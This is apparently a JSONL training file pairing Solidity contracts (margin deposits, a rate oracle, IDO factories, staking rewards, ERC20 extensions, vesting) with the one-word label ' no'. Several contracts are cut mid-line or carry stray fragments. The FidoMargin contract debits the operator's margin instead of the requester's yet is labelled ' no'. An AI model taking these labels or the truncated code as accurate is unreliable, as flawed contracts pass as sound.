\n \n /** \n * @dev Triggers stopped state. \n * \n * Requirements: \n * \n * - The contract must not be paused. \n */ \n function _pause() internal virtual whenNotPaused { \n _paused = true; \n emit Paused(_msgSender()); \n } \n \n /** \n * @dev Returns to normal state. \n * \n * Requirements: \n * \n * - The contract must be paused. \n */ \n function _unpause() internal virtual whenPaused { \n _paused = false; \n emit Unpaused(_msgSender()); \n } \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \nimport \"./Ownable.sol\"; \nimport \"./interfaces/IERC20.sol\"; \nimport \"./libraries/SafeMath.sol\"; \n \ncontract FidoMargin is Ownable { \n using SafeMath for uint256; \n \n address public operator; \n address public marginToken; \n mapping (address => uint256) public margin; \n mapping (address => bool) public withdrawStatus; \n mapping (address => uint256) public withdrawAmount; \n mapping (address => address) public withdrawRecipient; \n \n event DepositMargin(uint256 timestamp, address indexed sender, uint256 amount); \n event WithdrawRequest(uint256 timestamp, address indexed requester, uint256 amount, address index\n event WithdrawResult(uint256 timestamp, address indexed requester, bool result); \n \n event OperatorshipTransferred( \n address indexed previousOperator, \n address indexed newOperator \n ); \n constructor (address _operator, address _marginToken) Ownable() { \n operator = _operator; \n emit OperatorshipTransferred(address(0), operator); \n marginToken = _marginToken; \n } \n \n modifier onlyOperator() { \n require( \n _msgSender() == operator, \n \"Operable: caller is not the operator\" \n ); \n _; \n } \n \n function transferOperatorship(address newOperator) external onlyOwner { \n require( \n newOperator != address(0), \n \"Operable: new operator is the zero address\" \n ); \n emit OperatorshipTransferred(operator, newOperator); \n operator = newOperator; \n } \n \n function depositMargin(uint256 amount) external { \n IERC20(marginToken).transferFrom(_msgSender(), address(this), amount); \n margin[_msgSender()] = margin[_msgSender()].add(amount); \n emit DepositMargin(block.timestamp, _msgSender(), amount); \n } \n \n function withdrawRequest(address recipient, uint256 amount) external { \n require(!withdrawStatus[_msgSender()], \"FidoMargin: already sent a request\"); \n require(margin[_msgSender()] >= amount, \"FidoMargin: insufficient margin\"); \n \n withdrawStatus[_msgSender()] = true; \n withdrawAmount[_msgSender()] = amount; \n withdrawRecipient[_msgSender()] = recipient; \n emit WithdrawRequest(block.timestamp, _msgSender(), amount, recipient); \n } \n \n function withdrawResponse(address requester, bool result) external onlyOperator { \n require(withdrawStatus[requester], \"FidoMargin: request not found\"); \n if(result){ \n IERC20(marginToken).transfer(withdrawRecipient[requester], withdrawAmount[requester]); \n margin[_msgSender()] = margin[_msgSender()].sub(withdrawAmount[requester]); \n } \n withdrawStatus[requester] = false; \n withdrawRecipient[requester] = address(0); \n withdrawAmount[requester] = 0; \n emit WithdrawResult(block.timestamp, requester, result); \n } \n}// SPDX-License-Identifier: MIT \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \nimport \"../Ownable.sol\"; \nimport \"../Pausable.sol\"; \n \ncontract RateOracle is Ownable, Pausable { \n address public updater; \n address public requester; \n \n event UpdatershipTransferred( \n address indexed previousUpdater, \n address indexed newUpdater \n ); \n \n event RequestershipTransferred( \n address indexed previousRequester, \n address indexed newRequester \n ); \n \n modifier onlyUpdater() { \n require(_msgSender() == updater, \"Oracle: caller is not the updater\"); \n _; \n } \n \n modifier onlyRequester() { \n require( \n _msgSender() == requester, \n \"Oracle: caller is not the requester\" \n ); \n _; \n } \n \n bool private _status = false; // request but not updated -> false; request and updated -> true \n uint256 private _lastUpdateTime = 0; // last updated timestamp \n uint256 private _lastRequestTime = 0; // last request timestamp \n \n uint8 private _decimals = 18; // decimal \n uint256 private _rate; // rate \n \n event Request(uint256 indexed timestamp); \n event Update(uint256 indexed timestamp, uint256 rate); \n \n constructor(address _updater, address _requester) Ownable() Pausable() { \n updater = _updater; \n emit UpdatershipTransferred(address(0), updater); \n requester = _requester; \n emit RequestershipTransferred(address(0), requester); \n \n _lastRequestTime = block.timestamp; \n emit Request(block.timestamp); \n } \n \n function transferRequestership(address newRequester) external onlyOwner { \n require( \n newRequester != address(0), \n \"Oracle: new Requester is the zero address\" \n ); \n emit RequestershipTransferred(requester, newRequester); \n requester = newRequester; \n } \n \n function transferUpdatership(address newUpdater) external onlyOwner { \n require( \n newUpdater != address(0), \n \"Oracle: new Updater is the zero address\" \n ); \n emit UpdatershipTransferred(updater, newUpdater); \n updater = newUpdater; \n } \n \n function pause() external onlyOwner { \n _pause(); \n } \n \n function unPause() external onlyOwner { \n _unpause(); \n } \n \n function status() external view returns (bool) { \n return _status; \n } \n \n function lastRequestTime() external view returns (uint256) { \n return _lastRequestTime; \n } \n \n function lastUpdateTime() external view returns (uint256) { \n return _lastUpdateTime; \n } \n \n function decimals() external view whenNotPaused returns (uint8) { \n return _decimals; \n } \n \n function rate() external view whenNotPaused returns (uint256) { \n return _rate; \n } \n \n function request() external onlyRequester whenNotPaused { \n require(_status, \"Oracle: request already called\"); \n _status = false; \n _lastRequestTime = block.timestamp; \n emit Request(block.timestamp); \n } \n \n function update(uint256 rate_) external onlyUpdater whenNotPaused { \n require(!_status, \"Oracle: no request called\"); \n require(rate_ > 0, \"Oracle: rate can not be zero\"); \n _status = true; \n _lastUpdateTime = block.timestamp; \n _rate = rate_; \n emit Update(block.timestamp, _rate); \n } \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \nimport \"./MFIL-IDOToken.sol\"; \nimport \"./interfaces/IIDOInfo.sol\"; \n \ncontract MfilIdoTokenLPPoolFactory is Ownable { \n address public mfil; \n address public factory; \n address public MfilStakePool; \n address public operator; \n address public IDOInfo; \n address public FidoMember; \n \n uint256 public inviteFeeRate = 50; // inviteFee = inviteFeeRate / 10**inviteFeeRateDecimals \n uint8 public inviteFeeRateDecimals = 3; \n \n mapping (address => address) public ido2pool; \n \n event OperatorshipTransferred( \n address indexed previousOperator, \n address indexed newOperator \n ); \n \n event NewPool(address indexed idoToken, address indexed pool); \n \n constructor( \n address _operator, \n address _mfil, \n address _factory, \n address _IDOInfo, \n address _FidoMember, \n address _MfilStakePool \n ) Ownable() { \n operator = _operator; \n emit OperatorshipTransferred(address(0), operator); \n mfil = _mfil; \n factory = _factory; \n IDOInfo = _IDOInfo; \n FidoMember = _FidoMember; \n MfilStakePool = _MfilStakePool; \n \n } \n \n modifier onlyOperator() { \n require( \n _msgSender() == operator, \n \"Operable: caller is not the operator\" \n ); \n _; \n } \n \n function transferOperatorship(address newOperator) external onlyOwner { \n require( \n newOperator != address(0), \n \"Operable: new operator is the zero address\" \n ); \n emit OperatorshipTransferred(operator, newOperator); \n operator = newOperator; \n } \n \n function newPool(address idoToken) onlyOperator external returns (address pool) { \n require(IIDOInfo(IDOInfo).exist(idoToken), \"PoolFactory: idoToken not found\"); \n require(ido2pool[idoToken] == address(0), \"PoolFactory: pool exist\"); \n MfilIdoTokenLPPool newpool = new MfilIdoTokenLPPool(factory, operator, mfil, idoToken); \n pool = address(newpool); \n ido2pool[idoToken] = pool; \n emit NewPool(idoToken, pool); \n } \n \n function changePoolOperator(address idoToken, address newOperator) onlyOperator external { \n require(ido2pool[idoToken] != address(0), \"PoolFactory: pool not found\"); \n MfilIdoTokenLPPool(ido2pool[idoToken]).transferOperatorship(newOperator); \n } \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \nimport \"./Ownable.sol\"; \nimport \"./IDOToken.sol\"; \nimport \"./interfaces/IMdexPair.sol\"; \nimport \"./interfaces/IMdexFactory.sol\"; \n \n \ncontract IDOFactory is Ownable { \n using SafeMath for uint256; \n \n address[] public IDOlist; \n mapping(address => bool) public isIDO; \n mapping(address => address[]) public userIDOs; \n address public hfil; \n address public mfil; \n address public operator; // for start ido \n address public mdexFactory; \n \n event NewIDO(address indexed sender, address indexed ido); \n \n event OperatorshipTransferred( \n address indexed previousOperator, \n address indexed newOperator \n ); \n \n constructor( \n address _operator, \n address _hfil, \n address _mfil, \n address _mdexFactory \n ) Ownable() { \n operator = _operator; \n emit OperatorshipTransferred(address(0), operator); \n hfil = _hfil; \n mfil = _mfil; \n mdexFactory = _mdexFactory; \n } \n \n modifier onlyOperator() { \n require( \n _msgSender() == operator, \n \"Operable: caller is not the operator\" \n ); \n _; \n } \n \n function transferOperatorship(address newOperator) external onlyOwner { \n require( \n newOperator != address(0), \n \"Operable: new operator is the zero address\" \n ); \n emit OperatorshipTransferred(operator, newOperator); \n operator = newOperator; \n } \n \n function IDOlistCount() external view returns (uint256) { \n return IDOlist.length; \n } \n \n function userIDOsCount(address user) external view returns (uint256) { \n return userIDOs[user].length; \n } \n \n function _addLiquidity( \n address pair, \n address idoToken, \n uint256 idoAmount, \n uint256 mfilAmount \n ) internal { \n IERC20(idoToken).transfer(pair, idoAmount); \n TransferHelper.safeTransferFrom(mfil, _msgSender(), pair, mfilAmount); \n IMdexPair(pair).mint(address(0)); \n } \n \n \n function newIDO( \n string calldata _name, \n string calldata _node, \n address _hfilRecipient, \n uint256 _cap, \n uint256 _gasPrice, \n uint256 _sealPrice, \n uint256 _hardDrivePrice, \n uint256 _dailySaleCap, \n uint256 _idoStartTime, \n uint256 _idoEndTime \n ) external returns (address idoAddress) { \n require( \n _dailySaleCap >= 1e6, \n \"IDOFactory: dailysalecap should more than 1\" \n ); \n IDOToken ido = new IDOToken( \n _name, \n _node, \n hfil, \n _hfilRecipient, \n _cap, \n _dailySaleCap \n ); \n ido.setPrice(_gasPrice, _sealPrice, _hardDrivePrice); \n ido.setTimes(_idoStartTime, _idoEndTime); \n IDOlist.push(address(ido)); \n userIDOs[_msgSender()].push(address(ido)); \n address pair = IMdexFactory(mdexFactory).createPair(mfil, address(ido)); \n uint256 totalPrice = _gasPrice.add(_sealPrice).add(_hardDrivePrice).div(100); \n _addLiquidity(pair, address(ido), 1e4, totalPrice); \n emit NewIDO(_msgSender(), address(ido)); \n isIDO[address(ido)] = true; \n return address(ido); \n } \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \nimport \"./Ownable.sol\"; \nimport \"./Pausable.sol\"; \nimport \"./ReentrancyGuard.sol\"; \nimport \"./StakeRewardPerDay.sol\"; \n \ncontract StakeTokenPool is StakeRewardPerDay, Ownable, Pausable { \n \n using SafeMath for uint256; \n \n uint256 public BrewardRate; // Global Reward per Unit \n uint256 public BrewardPreBlock; \n uint256 public BlastUpdateBlock; // last adjust block height \n \n mapping(address => uint256) public BuserReward; \n mapping(address => uint256) public BuserRate; \n \n constructor() StakeRewardPerDay() { \n BrewardRate = 0; \n BrewardPreBlock = 0; \n BlastUpdateBlock = block.number; \n } \n \n modifier BupdateRate() { \n if ( \n BrewardPreBlock > 0 && \n totalStake > 0 && \n block.number > BlastUpdateBlock \n ) { \n uint256 deltaRate = \n BrewardPreBlock.mul(block.number - BlastUpdateBlock).div( \n totalStake \n ); \n BrewardRate = BrewardRate.add(deltaRate); \n } \n BlastUpdateBlock = block.number; \n _; \n } \n \n modifier BgetReward() { \n if ( \n userStake[_msgSender()] > 0 && BrewardRate > BuserRate[_msgSender()] \n ) { \n uint256 deltaReward = \n BrewardRate.sub(BuserRate[_msgSender()]).mul( \n userStake[_msgSender()] \n ); \n BuserReward[_msgSender()] = BuserReward[_msgSender()].add( \n deltaReward \n ); \n } \n BuserRate[_msgSender()] = BrewardRate; \n _; \n } \n \n function _setReward(uint256 amount) internal BupdateRate { \n BrewardPreBlock = amount.mul(1e18); \n } \n \n function _stake(uint256 amount) internal override updateRate getReward BupdateRate BgetReward { \n userStake[_msgSender()] = userStake[_msgSender()].add(amount); \n totalStake = totalStake.add(amount); \n } \n \n function _BhalveNoUpdate() internal returns (uint256 reward) { \n reward = BuserReward[_msgSender()].div(1e18); \n BuserReward[_msgSender()] = 0; \n } \n \n function _Bhalve() internal BupdateRate BgetReward returns (uint256 reward) { \n return _BhalveNoUpdate(); \n } \n \n function _unStakeAll() \n internal \n updateRate \n getReward \n BupdateRate \n BgetReward \n returns (uint256 stake, uint256 reward, uint256 rewardB) \n { \n stake = userStake[_msgSender()]; \n totalStake = totalStake.sub(stake); \n userStake[_msgSender()] = 0; \n reward = _halveNoUpdate(); \n rewardB = _BhalveNoUpdate(); \n } \n \n function _BcaleReward() internal view returns (uint256 reward) { \n if (userStake[_msgSender()] == 0) { \n return 0; \n } \n uint256 tempRate = BrewardRate; \n if ( \n BrewardPreBlock > 0 && \n totalStake > 0 && \n block.number > BlastUpdateBlock \n ) { \n uint256 deltaRate = \n BrewardPreBlock.mul(block.number - BlastUpdateBlock).div( \n totalStake \n ); \n tempRate = tempRate.add(deltaRate); \n } \n reward = BuserReward[_msgSender()]; \n if (tempRate > BuserRate[_msgSender()]) { \n uint256 deltaReward = \n tempRate.sub(BuserRate[_msgSender()]).mul( \n userStake[_msgSender()] \n ); \n reward = reward.add(deltaReward); \n } \n reward = reward.div(1e18); \n } \n \n}// SPDX-License-Identifier: MIT \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \nimport \"./libraries/SafeMath.sol\"; \nimport \"./Context.sol\"; \n \ncontract StakeRewardPerBlock is Context { \n using SafeMath for uint256; \n \n uint256 public BrewardRate; // Global Reward per Unit \n uint256 public BrewardPreBlock; \n uint256 public BlastUpdateBlock; // last adjust block height \n uint256 public totalStake; \n \n mapping(address => uint256) public userStake; \n mapping(address => uint256) public BuserReward; \n mapping(address => uint256) public BuserRate; \n \n constructor() { \n BrewardRate = 0; \n BrewardPreBlock = 0; \n totalStake = 0; \n BlastUpdateBlock = block.number; \n } \n \n modifier BupdateRate() { \n if ( \n BrewardPreBlock > 0 && \n totalStake > 0 && \n block.number > BlastUpdateBlock \n ) { \n uint256 deltaRate = \n BrewardPreBlock.mul(block.number - BlastUpdateBlock).div( \n totalStake \n ); \n BrewardRate = BrewardRate.add(deltaRate); \n } \n BlastUpdateBlock = block.number; \n _; \n } \n \n modifier BgetReward() { \n if ( \n userStake[_msgSender()] > 0 && BrewardRate > BuserRate[_msgSender()] \n ) { \n uint256 deltaReward = \n BrewardRate.sub(BuserRate[_msgSender()]).mul( \n userStake[_msgSender()] \n ); \n BuserReward[_msgSender()] = BuserReward[_msgSender()].add( \n deltaReward \n ); \n } \n BuserRate[_msgSender()] = BrewardRate; \n _; \n } \n \n function _setReward(uint256 amount) internal BupdateRate { \n BrewardPreBlock = amount.mul(1e18); \n } \n \n function _stake(uint256 amount) internal BupdateRate BgetReward { \n userStake[_msgSender()] = userStake[_msgSender()].add(amount); \n totalStake = totalStake.add(amount); \n } \n \n function _BhalveNoUpdate() internal returns (uint256 reward) { \n reward = BuserReward[_msgSender()].div(1e18); \n BuserReward[_msgSender()] = 0; \n } \n \n function _Bhalve() internal BupdateRate BgetReward returns (uint256 reward) { \n return _BhalveNoUpdate(); \n } \n \n function _unStake() \n internal \n BupdateRate \n BgetReward \n returns (uint256 stake, uint256 reward) \n { \n stake = userStake[_msgSender()]; \n totalStake = totalStake.sub(stake); \n userStake[_msgSender()] = 0; \n reward = _BhalveNoUpdate(); \n } \n \n function _getStake() internal view returns (uint256 stake) { \n stake = userStake[_msgSender()]; \n } \n \n function _BcaleReward() internal view returns (uint256 reward) { \n if (userStake[_msgSender()] == 0) { \n return 0; \n } \n uint256 tempRate = BrewardRate; \n if ( \n BrewardPreBlock > 0 && \n totalStake > 0 && \n block.number > BlastUpdateBlock \n ) { \n uint256 deltaRate = \n BrewardPreBlock.mul(block.number - BlastUpdateBlock).div( \n totalStake \n ); \n tempRate = tempRate.add(deltaRate); \n } \n reward = BuserReward[_msgSender()]; \n if (tempRate > BuserRate[_msgSender()]) { \n uint256 deltaReward = \n tempRate.sub(BuserRate[_msgSender()]).mul( \n userStake[_msgSender()] \n ); \n reward = reward.add(deltaReward); \n } \n reward = reward.div(1e18); \n } \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \nimport \"../Context.sol\"; \nimport \"./ERC20Pausable.sol\"; \n \n/** \n * @dev Extension of {ERC20} that allows token holders to destroy both their own \n * tokens and those that they have an allowance for, in a way that can be \n * recognized off-chain (via event analysis). \n */ \nabstract contract ERC20Burnable is Context, ERC20Pausable { \n using SafeMath for uint256; \n \n /** \n * @dev Destroys `amount` tokens from the caller. \n * \n * See {ERC20-_burn}. \n */ \n function burn(uint256 amount) public virtual { \n _burn(_msgSender(), amount); \n } \n \n /** \n * @dev Destroys `amount` tokens from `account`, deducting from the caller's \n * allowance. \n * \n * See {ERC20-_burn} and {ERC20-allowance}. \n * \n * Requirements: \n * \n * - the caller must have allowance for ``accounts``'s tokens of at least \n * `amount`. \n */ \n function burnFrom(address account, uint256 amount) public virtual { \n uint256 decreasedAllowance = allowance(account, _msgSender()).sub(amount, \"ERC20: burn amount \n \n _approve(account, _msgSender(), decreasedAllowance); \n _burn(account, amount); \n } \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \nimport \"../Context.sol\"; \nimport \"./ERC20Pausable.sol\"; \n \nabstract contract ERC20Mintable is Context, ERC20Pausable { \n using SafeMath for uint256; \n \n mapping(address => bool) public isMinter; \n \n event AddMinter(address indexed minter); \n event RemoveMinter(address indexed minter); \n event Mint( \n address indexed minter, \n address indexed recipient, \n uint256 amount \n ); \n \n modifier onlyMinter() { \n require(isMinter[_msgSender()], \"ERC20: sender is not minter\"); \n _; \n } \n \n function _addMinter(address minter) internal { \n require(!isMinter[minter], \"ERC20: already a minter\"); \n isMinter[minter] = true; \n emit AddMinter(minter); \n } \n \n function _removeMinter(address minter) internal { \n require(isMinter[minter], \"ERC20: not a minter\"); \n isMinter[minter] = false; \n emit RemoveMinter(minter); \n } \n \n function mint(address recipient, uint256 amount) external onlyMinter { \n _mint(recipient, amount); \n emit Mint(_msgSender(), recipient, amount); \n } \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \nimport \"./ERC20.sol\"; \nimport \"../Pausable.sol\"; \n \n/** \n * @dev ERC20 token with pausable token transfers, minting and burning. \n * \n * Useful for scenarios such as preventing trades until the end of an evaluation \n * period, or having an emergency switch for freezing all token transfers in the \n * event of a large bug. \n */ \nabstract contract ERC20Pausable is ERC20, Pausable { \n /** \n * @dev See {ERC20-_beforeTokenTransfer}. \n * \n * Requirements: \n * \n * - the contract must not be paused. \n */ \n function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override\n super._beforeTokenTransfer(from, to, amount); \n \n require(!paused(), \"ERC20Pausable: token transfer while paused\"); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.7.6; \n \nimport \"./Ownable.sol\"; \n \ncontract IDOInfo is Ownable { \n address public operator; \n \n mapping(address => bool) public exist; \n mapping(address => bool) public isPool; \n address[] public IDOList; \n mapping(address => address) public payer2pool; \n mapping(address => address) public stakeAddress; \n mapping(address => address) public pool2idoToken; \n \n event OperatorshipTransferred( \n address indexed previousOperator, \n address indexed newOperator \n ); \n \n event AddIDO(uint256 timestamp, address idoToken); \n \n event SetPayer(uint256 timestamp, address pool, address payer); \n \n event SetStakeAddress( \n uint256 timestamp, \n address idoToken, \n address _stakeAddress \n ); \n \n constructor(address _operator) Ownable() { \n operator = _operator; \n emit OperatorshipTransferred(address(0), operator); \n } \n \n modifier onlyOperator() { \n require( \n _msgSender() == operator, \n \"Operable: caller is not the operator\" \n ); \n _; \n } \n \n function transferOperatorship(address newOperator) external onlyOwner { \n require( \n newOperator != address(0), \n \"Operable: new operator is the zero address\" \n ); \n emit OperatorshipTransferred(operator, newOperator); \n operator = newOperator; \n } \n \n function IDOListCount() external view returns (uint256) { \n return IDOList.length; \n } \n \n function addIDO(address idoToken) external onlyOperator { \n require(!exist[idoToken], \"IDOINFO: already here\"); \n exist[idoToken] = true; \n IDOList.push(idoToken); \n emit AddIDO(block.timestamp, idoToken); \n } \n \n function setPayer(address pool, address payer) external onlyOperator { \n require(isPool[pool], \"IDOINFO: pool not found\"); \n payer2pool[payer] = pool; \n emit SetPayer(block.timestamp, pool, payer); \n } \n \n function setStakeAddress(address idoToken, address _stakeAddress) \n external \n onlyOperator \n { \n require(exist[idoToken], \"IDOINFO: idoToken not found\"); \n isPool[_stakeAddress] = true; \n pool2idoToken[_stakeAddress] = idoToken; \n stakeAddress[idoToken] = _stakeAddress; \n emit SetStakeAddress(block.timestamp, idoToken, _stakeAddress); \n } \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \nabstract contract ReentrancyGuard { \n \n uint256 private constant _NOT_ENTERED = 1; \n uint256 private constant _ENTERED = 2; \n \n uint256 private _status; \n \n constructor () { \n _status = _NOT_ENTERED; \n } \n \n modifier nonReentrant() { \n // On the first call to nonReentrant, _notEntered will be true \n require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\"); \n \n // Any calls to nonReentrant after this point will fail \n _status = _ENTERED; \n \n _; \n \n // By storing the original value once again, a refund is triggered (see \n // https://eips.ethereum.org/EIPS/eip-2200) \n _status = _NOT_ENTERED; \n } \n} \n \nAnalysis of audit results\nRe-Entrancy\n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.10; \n \nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; \nimport \"@openzeppelin/contracts/access/Ownable.sol\"; \n \ncontract GFTToken is ERC20, Ownable { \n constructor( \n string memory name, \n string memory symbol \n ) payable ERC20(name, symbol) {} \n \n function mint(address account, uint256 amount) public onlyOwner { \n require(totalSupply() + amount <= 1100000000 * 10 ** decimals()); \n _mint(account, amount); \n } \n \n function burn(uint256 amount) public { \n _burn(msg.sender, amount); \n } \n} \nGFTTokenVesting.sol\n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.8.10; \n \nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; \nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\"; \nimport \"@openzeppelin/contracts/access/Ownable.sol\"; \n \ncontract GFTTokenVesting is Ownable { \n using SafeERC20 for IERC20; \n \n event Released(address beneficiary, uint256 amount); \n \n IERC20 public token; \n uint256 public cliff; \n uint256 public start; \n uint256 public duration; \n uint256 public period; \n uint256 public percent; \n \n mapping (address => uint256) public shares; \n mapping (address => uint256) public lastReleaseDate; \n mapping (address => uint256) public releasedAmount; \n \n uint256 released = 0; \n uint256 BP = 10000; \n \n address[] public beneficiaries; \n \n modifier onlyBeneficiaries { \n require(msg.sender == owner() || shares[msg.sender] > 0, \"You cannot release tokens!\"); \n _; \n } \n \n constructor( \n IERC20 _token, \n uint256 _start, \n uint256 _cliff, \n uint256 _duration, \n uint256 _period, \n uint256 _percent \n ) { \n require(_cliff <= _duration, \"Cliff has to be lower or equal to duration\"); \n token = _token; \n duration = _duration; \n cliff = _start + _cliff; \n start = _start; \n period = _period; \n percent = _percent; \n } \n \n function addBeneficiaryes(address[] memory _beneficiaryes, uint256[] memory _sharesAmounts) onlyOwn\n require(_beneficiaryes.length == _sharesAmounts.length); \n \n for (uint i = 0; i <_beneficiaryes.length; i++) { \n addBeneficiary(_beneficiaryes[i], _sharesAmounts[i]); \n } \n \n require(totalShares() == 10000, \"Invalid shares amount\"); \n } \n \n function addBeneficiary(address _beneficiary, uint256 _sharesAmount) onlyOwner public { \n require(block.timestamp < cliff); \n require(_beneficiary != address(0), \"The beneficiary's address cannot be 0\"); \n require(_sharesAmount > 0, \"Shares amount has to be greater than 0\"); \n \n if (shares[_beneficiary] == 0) { \n beneficiaries.push(_beneficiary); \n } \n \n lastReleaseDate[_beneficiary] = cliff; \n shares[_beneficiary] = shares[_beneficiary] + _sharesAmount; \n } \n \n function claimTokens() onlyBeneficiaries public { \n uint256 currentBalance = token.balanceOf(address(this)); \n uint256 totalBalance = currentBalance + released; \n \n require(releasedAmount[msg.sender] < calculateShares(totalBalance, msg.sender), \"User already rel\n \n uint256 unreleased = releasableAmount(); \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/* \n * @dev Provides information about the current execution context, including the \n * sender of the transaction and its data. While these are generally available \n * via msg.sender and msg.data, they should not be accessed in such a direct \n * manner, since when dealing with GSN meta-transactions the account sending and \n * paying for execution may not be the actual sender (as far as an application \n * is concerned). \n * \n * This contract is only required for intermediate, library-like contracts. \n */ \nabstract contract Context { \n function _msgSender() internal view virtual returns (address payable) { \n return msg.sender; \n } \n \n function _msgData() internal view virtual returns (bytes memory) { \n this; // silence state mutability warning without generating bytecode - see https://github.co\n return msg.data; \n } \n} \n \n \n// File @openzeppelin/contracts/token/ERC20/IERC20.sol@v3.4.2 \n \n// : MIT \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @dev Interface of the ERC20 standard as defined in the EIP. \n */ \ninterface IERC20 { \n /** \n * @dev Returns the amount of tokens in existence. \n */ \n function totalSupply() external view returns (uint256); \n \n /** \n * @dev Returns the amount of tokens owned by `account`. \n */ \n function balanceOf(address account) external view returns (uint256); \n \n /** \n * @dev Moves `amount` tokens from the caller's account to `recipient`. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n /** \n * @dev Returns the remaining number of tokens that `spender` will be \n * allowed to spend on behalf of `owner` through {transferFrom}. This is \n * zero by default. \n * \n * This value changes when {approve} or {transferFrom} are called. \n */ \n function allowance(address owner, address spender) external view returns (uint256); \n \n /** \n * @dev Sets `amount` as the allowance of `spender` over the caller's tokens. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * IMPORTANT: Beware that changing an allowance with this method brings the risk \n * that someone may use both the old and the new allowance by unfortunate \n * transaction ordering. One possible solution to mitigate this race \n * condition is to first reduce the spender's allowance to 0 and set the \n * desired value afterwards: \n * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 \n * \n * Emits an {Approval} event. \n */ \n function approve(address spender, uint256 amount) external returns (bool); \n \n /** \n * @dev Moves `amount` tokens from `sender` to `recipient` using the \n * allowance mechanism. `amount` is then deducted from the caller's \n * allowance. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n /** \n * @dev Emitted when `value` tokens are moved from one account (`from`) to \n * another (`to`). \n * \n * Note that `value` may be zero. \n */ \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n /** \n * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n * a call to {approve}. `value` is the new allowance. \n */ \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \n \n// File @openzeppelin/contracts/math/SafeMath.sol@v3.4.2 \n \n// : MIT \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0;\nmailto:openzeppelin/contracts/access/Ownable.sol@v3.4.2\n/**\n@dev Contract module which provides a basic access control mechanism, where\nthere is an account (an owner) that can be granted exclusive access to\nspecific functions. *\nBy default, the owner account will be the one that deploys the contract. This\ncan later be changed with {transferOwnership}. *\nThis module is used through inheritance. It will make available the modifier\n onlyOwner , which can be applied to your functions to restrict their use to\nthe owner. */ abstract contract Ownable is Context { address private _owner;\nevent OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n/**\n@dev Initializes the contract setting the deployer as the initial owner. */ constructor () internal { address\nmsgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); }\n/**\n@dev Returns the address of the current owner. */ function owner() public view virtual returns (address) {\nreturn _owner; }\n/**\n@dev Throws if called by any account other than the owner. */ modifier onlyOwner() { require(owner() ==\n_msgSender(), \"Ownable: caller is not the owner\"); _; }\n/**\n@dev Leaves the contract without owner. It will not be possible to call\n onlyOwner functions anymore. Can only be called by the current owner. *\nNOTE: Renouncing ownership will leave the contract without an owner,\nthereby removing any functionality that is only available to the owner. */ function renounceOwnership()\npublic virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }\n/**\n@dev Transfers ownership of the contract to a new account ( newOwner ).\nCan only be called by the current owner. */ function transferOwnership(address newOwner) public virtual\nonlyOwner { require(newOwner != address(0), \"Ownable: new owner is the zero address\"); emit\nOwnershipTransferred(_owner, newOwner); _owner = newOwner; } }\n// File contracts/LfgToken.sol\n// : MIT pragma solidity ^0.6.0;\ncontract LfgToken is ERC20, Ownable { // uint256 private constant preMineSupply = 20000000 * 1e18;\nusing EnumerableSet for EnumerableSet.AddressSet; \nEnumerableSet.AddressSet private _minters; \n \nconstructor() public ERC20(\"LfgSwap Finance Token\", \"LFG\"){ \n // _mint(msg.sender, preMineSupply); \n} \n \n// mint with max supply \nfunction mint(address _to, uint256 _amount) public onlyMinter returns (bool) { \n _mint(_to, _amount); \n return true; \n} \n \nfunction addMinter(address _addMinter) public onlyOwner returns (bool) { \n require(_addMinter != address(0), \"JfToken: _addMinter is the zero address\"); \n return EnumerableSet.add(_minters, _addMinter); \n} \n \nfunction delMinter(address _delMinter) public onlyOwner returns (bool) { \n require(_delMinter != address(0), \"JfToken: _delMinter is the zero address\"); \n return EnumerableSet.remove(_minters, _delMinter); \n} \n \nfunction getMinterLength() public view returns (uint256) { \n return EnumerableSet.length(_minters); \n} \n \nfunction isMinter(address account) public view returns (bool) { \n return EnumerableSet.contains(_minters, account); \n} \n \nfunction getMinter(uint256 _index) public view onlyOwner returns (address){ \n require(_index <= getMinterLength() - 1, \"JfToken: index out of bounds\"); \n return 